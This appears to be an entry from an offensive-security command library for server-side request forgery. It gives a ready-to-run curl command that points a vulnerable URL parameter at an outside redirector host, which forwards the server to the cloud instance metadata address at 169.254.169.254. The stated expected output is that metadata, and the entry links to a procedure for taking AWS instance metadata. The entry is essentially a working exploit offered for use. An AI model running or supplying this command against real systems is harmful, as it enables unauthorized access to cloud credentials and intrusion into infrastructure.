---
type: command
executor: bash
data: 'curl "$_VULN_URL?target=http://nicob.net/redir-http-169.254.169.254:80-" -v'
output: null
created_at: '2023-04-06T03:56:38Z'
updated_at: '2023-04-10T20:23:59Z'
platforms:
  - Web
tags:
  - ssrf
  - redirect
verified: true
validated: true
---

# curl-dynamic-redirect-to-metadata

## Command

```bash
curl "$_VULN_URL?target=http://nicob.net/redir-http-169.254.169.254:80-" -v
```

## Description

Dynamic redirect to metadata.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_VULN_URL | Vulnerable URL | Yes |

## Examples

### Basic Usage

As shown.

## Expected Output

Metadata via redirect.

## Related

- [[procedures/Exploit-SSRF-to-Access-AWS-Instance-Metadata]]
